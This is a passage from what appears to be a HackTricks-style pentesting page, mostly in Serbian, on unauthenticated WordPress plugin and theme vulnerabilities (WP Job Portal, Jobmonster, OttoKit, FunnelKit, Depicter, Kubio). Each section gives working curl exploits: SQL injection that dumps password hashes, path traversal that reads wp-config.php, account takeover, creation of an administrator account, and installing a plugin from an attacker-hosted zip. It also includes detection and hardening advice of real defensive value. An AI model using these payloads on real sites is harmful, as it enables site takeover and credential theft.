- **OgraniÄite broj pokuÅ¡aja prijave** da biste spreÄili Brute Force napade
- Preimenujte fajl **`wp-admin.php`** i dozvolite pristup samo interno ili sa odreÄ‘enih IP adresa.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal recruitment plugin je izloÅ¾io zadatak **savecategory** koji na kraju izvrÅ¡ava sledeÄ‡i ranjivi kod u `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemi uvedeni ovim isjeÄkom:

1. **Nesanitizovani korisniÄki unos** â€“ `parentid` dolazi direktno iz HTTP zahteva.
2. **Spajanje stringova unutar WHERE klauzule** â€“ nema `is_numeric()` / `esc_sql()` / pripremljenog upita.
3. **Neautentifikovan pristup** â€“ iako se akcija izvrÅ¡ava kroz `admin-post.php`, jedina provera koja postoji je a **CSRF nonce** (`wp_verify_nonce()`), koji bilo koji posetilac moÅ¾e preuzeti sa javne stranice koja ubacuje shortcode `[wpjobportal_my_resumes]`.

#### Eksploatacija

1. Preuzmi novi nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injektuj proizvoljan SQL zloupotrebom `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Odgovor otkriva rezultat injektovanog upita ili menja bazu podataka, dokazujuÄ‡i SQLi.


### Neautentifikovano Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

JoÅ¡ jedan zadatak, **downloadcustomfile**, je omoguÄ‡avao posetiocima da preuzmu **bilo koji fajl na disku** putem path traversal-a. Ranljiv sink se nalazi u `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` je pod kontrolom napadaÄa i konkateniran **bez sanitizacije**. Ponovo, jedina prepreka je **CSRF nonce** koji se moÅ¾e dohvatiti sa stranice rezimea.

#### Eksploatacija
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
The server responds with the contents of `wp-config.php`, leaking DB credentials and auth keys.

## Preuzimanje naloga bez autentifikacije preko Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Mnogo tema/plugina sadrÅ¾i "social login" pomoÄ‡nike izloÅ¾ene putem admin-ajax.php. Ako neautentifikovana AJAX akcija (wp_ajax_nopriv_...) veruje identifikatorima koje Å¡alje klijent kada podaci provajdera nedostaju i zatim pozove wp_set_auth_cookie(), to postaje potpuni zaobilaÅ¾enje autentifikacije.

TipiÄan pogreÅ¡an obrazac (pojednostavljeno)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
ZaÅ¡to je iskoriÅ¡tivo

- Pristup bez autentifikacije preko admin-ajax.php (wp_ajax_nopriv_â€¦ action).
- Nema provere nonce/capability pre promene stanja.
- Nedostaje verifikacija OAuth/OpenID providera; default branch prihvata ulaz od napadaÄa.
- get_user_by('email', $_POST['id']) praÄ‡eno wp_set_auth_cookie($uid) autentifikuje podnosioca zahteva kao bilo koju postojeÄ‡u email adresu.

Eksploatacija (neautentifikovano)

- Preduslovi: napadaÄ moÅ¾e da dosegne /wp-admin/admin-ajax.php i zna/pogaÄ‘a vaÅ¾eÄ‡u korisniÄku email adresu.
- Podesite provider na nepodrÅ¾anu vrednost (ili ga izostavite) da biste pogodili default branch i prosledili id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* za korisnika Å¾rtve; naredni zahtevi su autentifikovani.

Finding the action name

- Pregledajte temu/plugin za add_action('wp_ajax_nopriv_...', '...') registracije u kodu za social login (npr. framework/add-ons/social-login/class-social-login.php).
- Grep za wp_set_auth_cookie(), get_user_by('email', ...) unutar AJAX handlera.

Detection checklist

- Web logovi koji pokazuju neautentifikovane POST-ove na /wp-admin/admin-ajax.php sa social-login akcijom i id=<email>.
- 200 odgovori sa success JSON-om koji odmah prethode autentifikovanom saobraÄ‡aju sa iste IP/User-Agent.

Hardening

- Ne izvlaÄite identitet iz klijentskog unosa. Prihvatati samo emailove/ID-e koji potiÄu iz validiranog tokena/ID-a provajdera.
- Zahtijevajte CSRF nonces i provere privilegija Äak i za pomoÄ‡nike za prijavu; izbegavajte registraciju wp_ajax_nopriv_ osim ako nije strogo neophodno.
- Validirajte i verifikujte OAuth/OIDC odgovore na serverskoj strani; odbacite nedostajuÄ‡e/nevaÅ¾eÄ‡e providere (bez fallback-a na POST id).
- Razmotrite privremeno onemoguÄ‡avanje social login-a ili virtuelno zakrpljivanje na edge-u (blokirajte ranjivu akciju) dok se ne popravi.

Patched behaviour (Jobmonster 4.8.0)

- Uklonjen nesiguran fallback iz $_POST['id']; $user_email mora poticati iz verifikovanih provider grana u switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

Some plugins expose REST endpoints that mint reusable â€œconnection keysâ€ or tokens without verifying the callerâ€™s capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions â†’ RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ kreirajte connection key i upotrebite ga
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
ZaÅ¡to je iskoristivo
- Osetljiva REST ruta zaÅ¡tiÄ‡ena samo slabim dokazom identiteta (korisniÄko ime/email) ili nedostaje permission_callback
- Nema sprovoÄ‘enja capability; izdati kljuÄ se prihvata kao univerzalno zaobilaÅ¾enje

Kontrolna lista za detekciju
- Grep-uj kod plugina za register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Bilo koja ruta koja izdaje tokene/kljuÄeve zasnovane na identitetu poslatom u zahtevu (korisniÄko ime/email) bez vezivanja za autentifikovanog korisnika ili capability
- TraÅ¾i naredne rute koje prihvataju izdati token/kljuÄ bez provere capability na serverskoj strani

OjaÄavanje
- Za svaku privilegovanu REST rutu: zahtevati permission_callback koji poziva current_user_can() za potrebnu capability
- Ne izdavati dugoveÄne kljuÄeve na osnovu identiteta poslatog od klijenta; ako je potrebno, izdavati kratkotrajne tokene vezane za korisnika nakon autentifikacije i ponovo proveravati capability pri upotrebi
- Validirajte korisniÄki kontekst pozivaoca (wp_set_current_user nije sam po sebi dovoljan) i odbacite zahteve gde !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse â†’ neautentifikovana proizvoljna instalacija plugina (FunnelKit Automations â‰¤ 3.5.3)

Nonces spreÄavaju CSRF, ne autorizaciju. Ako kod tretira uspeÅ¡an nonce kao zeleno svetlo i onda preskaÄe provere capability za privilegovane operacije (npr. install/activate plugins), neautentifikovani napadaÄi mogu zadovoljiti slabi nonce uslov i postiÄ‡i RCE instaliranjem backdoored or vulnerable plugin.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handler-i koji menjaju plugins/themes, a koriste samo wp_verify_nonce()/check_admin_referer() i bez provere privilegija
- Bilo koji code path koji postavlja $skip_caps = true nakon validacije nonce-a

Hardening
- Uvek tretirajte nonces samo kao CSRF tokene; primenjujte provere privilegija bez obzira na stanje nonce-a
- Zahtevajte current_user_can('install_plugins') i current_user_can('activate_plugins') pre nego Å¡to se doÄ‘e do installer koda
- Odbacite neautentifikovan pristup; izbegavajte izlaganje nopriv AJAX actions za privilegovane tokove

---

## Unauthenticated SQLi via s search parameter in depicter-* actions (Depicter Slider â‰¤ 3.6.1)

ViÅ¡e depicter-* actions je koristilo parametar s (search) i konkateniralo ga u SQL upite bez parameterizacije.

- Parameter: s (search)
- Flaw: direktna string concatenation u WHERE/LIKE klauzulama; nema prepared statements/sanitization
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep for depicter-* action handlers and direct use of $_GET['s'] or $_POST['s'] in SQL
- Review custom queries passed to $wpdb->get_results()/query() concatenating s

Hardening
- Always use $wpdb->prepare() or wpdb placeholders; reject unexpected metacharacters server-side
- Add a strict allowlist for s and normalize to expected charset/length

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder â‰¤ 2.5.1)

Accepting attacker-controlled paths in a template parameter without normalization/containment allows reading arbitrary local files, and sometimes code execution if includable PHP/log files are pulled into runtime.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: no normalization/allowlisting; traversal permitted
- Impact: secret disclosure (wp-config.php), potential RCE in specific environments (log poisoning, includable PHP)

PoC â€“ Äitanje wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Kontrolna lista za detekciju
- Bilo koji handler koji spaja request paths u include()/require()/read sinks bez realpath() containment
- TraÅ¾ite traversal obrasce (../) koji dopiru izvan predviÄ‘enog direktorijuma sa template-ima

OjaÄavanje
- Primorajte koriÅ¡Ä‡enje dozvoljenih (allowlisted) template-a; reÅ¡avajte sa realpath() i zahtevajte str_starts_with(realpath(file), realpath(allowed_base))
- Normalizujte ulaz; odbacite traversal sekvence i apsolutne putanje; koristite sanitize_file_name() samo za imena fajlova (ne za pune putanje)


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
